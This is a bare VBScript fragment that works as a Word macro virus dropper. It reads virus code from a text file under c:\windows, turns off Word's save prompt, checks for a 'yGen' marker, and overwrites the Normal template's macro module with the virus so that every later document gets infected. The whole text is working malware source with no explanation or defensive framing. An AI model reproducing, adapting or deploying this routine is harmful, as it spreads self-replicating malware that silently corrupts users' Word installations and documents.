Set FSO = CreateObject("Scripting.FileSystemObject")
Set f = FSO.OpenTextFile("c:\windows\test4.txt", 1, True)
wordvirus = f.readall()
f.close

Set WordObj = CreateObject("Word.Application")
WordObj.Options.SaveNormalPrompt = False
Set NT= WordObj.normaltemplate.vbproject.vbcomponents(1).codemodule
If NT.Lines(3,1) <> "'MyName = yGen" then
 NT.deletelines 1, NT.countoflines
 NT.insertlines 1, wordvirus
End If
set NT = nothing
WordObj.Quit
